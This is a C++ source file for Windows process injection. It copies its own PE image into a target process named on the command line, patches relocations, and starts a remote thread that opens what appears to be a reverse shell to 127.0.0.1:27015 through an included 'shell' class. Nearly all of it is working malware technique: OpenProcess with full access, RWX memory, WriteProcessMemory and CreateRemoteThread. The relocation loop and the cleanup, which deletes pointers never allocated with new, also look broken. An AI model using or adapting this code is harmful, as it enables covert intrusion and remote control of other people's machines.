#include "shell.h"
#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>

DWORD WINAPI ThreadInject(PVOID64);
DWORD GetProcessIdByName(const char * name);

int main(int argc, const char* argv[]) {
	if (argc < 2) {
		std::cout << "[-] Failed to specify process\n";
		exit(EXIT_FAILURE);
	}

	std::cout << "[*] Opening process...\n";
	HANDLE hProc = NULL;
	//hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetProcessIdByName(argv[1]));
	hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIdByName(argv[1]));

	if (!hProc) {
		std::cout << "[-] Could not open target process\n";
		exit(EXIT_FAILURE);
	}
	std::cout << "[+] Opened process " << argv[1] << std::endl;

	PVOID ImageBase = GetModuleHandle(NULL);
	if (!ImageBase) {
		std::cout << "[-] Could not get image base\n";
		exit(EXIT_FAILURE);
	}
	std::cout << "[+] Got image base\n";

	PIMAGE_DOS_HEADER dosHeader = NULL;
	dosHeader = (PIMAGE_DOS_HEADER)ImageBase;
	if (!dosHeader) {
		std::cout << "[-] Could not get dos header\n";
		exit(EXIT_FAILURE);
	}
	std::cout << "[+] Got DOS header\n";

	PIMAGE_NT_HEADERS ntHeader = NULL;
	ntHeader = (PIMAGE_NT_HEADERS)((PUCHAR)ImageBase + dosHeader->e_lfanew);
	if (!ntHeader) {
		std::cout << "[-] Could not get image NT headers\n";
		exit(EXIT_FAILURE);
	}
	std::cout << "[+] Got NT headers\n";

	PVOID64 allocMem = NULL;
	allocMem = VirtualAllocEx(hProc, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!allocMem) {
		std::cout << "[-] Could not get image NT headers\n";
		exit(EXIT_FAILURE);
	}
	std::cout << "[+] Allocated memory in target process\n";

	PVOID64 buffer = NULL;
	buffer = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buffer) {
		std::cout << "[-] Could not allocate memory for buffer\n";
		exit(EXIT_FAILURE);
	}
	std::cout << "[+] Allocated memory for buffer\n";

	memcpy(buffer, ImageBase, ntHeader->OptionalHeader.SizeOfImage);
	std::cout << "[+] Copied image to buffer\n";

	PIMAGE_BASE_RELOCATION baseRelocation = NULL;
	baseRelocation = (PIMAGE_BASE_RELOCATION)((PUCHAR)buffer + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	if (!baseRelocation) {
		std::cout << "[-] Could not get image base relocation\n";
		exit(EXIT_FAILURE);
	}
	std::cout << "[+] Got image base relocation\n";


	ULONG64 Delta = NULL;
	Delta = (ULONG64)allocMem - (ULONG64)ImageBase;
	if (!Delta) {
		std::cout << "[-] Could not calculate allocated image size\n";
		exit(EXIT_FAILURE);
	}

	ULONG64 Count = 0, i = 0, *p = NULL;
	PUSHORT Offset = NULL;
	while (baseRelocation->VirtualAddress) {
		if (baseRelocation->SizeOfBlock == sizeof(IMAGE_BASE_RELOCATION)) {
			Count = (baseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) / sizeof(USHORT));
			Offset = (PUSHORT)baseRelocation + 1;
			for (i = 0; i < Count; i++) {
				if (Offset[i]) {
					p = (PULONG64)((PUCHAR)buffer + baseRelocation->VirtualAddress + (Offset[i] & 0x0FFF));
					*p += Delta;
				}
			}
		}
		baseRelocation = (PIMAGE_BASE_RELOCATION)((PUCHAR)baseRelocation + baseRelocation->SizeOfBlock);
	}

	BOOL bWrite = false;
	bWrite = WriteProcessMemory(hProc, allocMem, buffer, ntHeader->OptionalHeader.SizeOfImage, NULL);
	if (!bWrite) {
		std::cout << "[-] Failed to write ProcMem\n";
		VirtualFreeEx(hProc, allocMem, 0, MEM_RELEASE);
		CloseHandle(hProc);
		exit(EXIT_FAILURE);
	}
	std::cout << "[+] Written ProcMem\n";

	VirtualFree(buffer, 0, MEM_RELEASE);
	std::cout << "[+] Cleared buffer\n";

	HANDLE hThread = NULL;
	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)((PUCHAR)ThreadInject + Delta), NULL, 0, NULL);
	if (!hThread) {
		std::cout << "[-] Failed to create thread\n";
		VirtualFreeEx(hProc, allocMem, 0, MEM_RELEASE);
		CloseHandle(hProc);
		exit(EXIT_FAILURE);
	}
	std::cout << "[+] Created thread in target proc\n";

	std::cout << "[*] Waiting for thread to terminate...\n";
	WaitForSingleObject(hThread, INFINITE);
	std::cout << "[*] Thread either terminated or force continued\n";

	VirtualFreeEx(hProc, allocMem, 0, MEM_RELEASE);
	std::cout << "[+] Cleaned allocated memory\n[*] Cleaning up...\n";
	delete ImageBase;
	delete dosHeader;
	delete ntHeader;
	delete allocMem;
	delete buffer;
	delete baseRelocation;
	delete Offset;
	CloseHandle(hProc);
	CloseHandle(hThread);

	return 0;
}


DWORD WINAPI ThreadInject(PVOID64 Param)
{
	shell ripafshell((char *)"127.0.0.1", 27015);
	return 0;
}

DWORD GetProcessIdByName(const char * name) {
	PROCESSENTRY32 pe32;
	HANDLE snapshot = NULL;
	DWORD pid = 0;
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE) {
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(snapshot, &pe32)) {
			do {
				if (!lstrcmp(pe32.szExeFile, name)) {
					pid = pe32.th32ProcessID;
					break;
				}
			} while (Process32Next(snapshot, &pe32));
		}
		CloseHandle(snapshot);
	}
	return pid;
}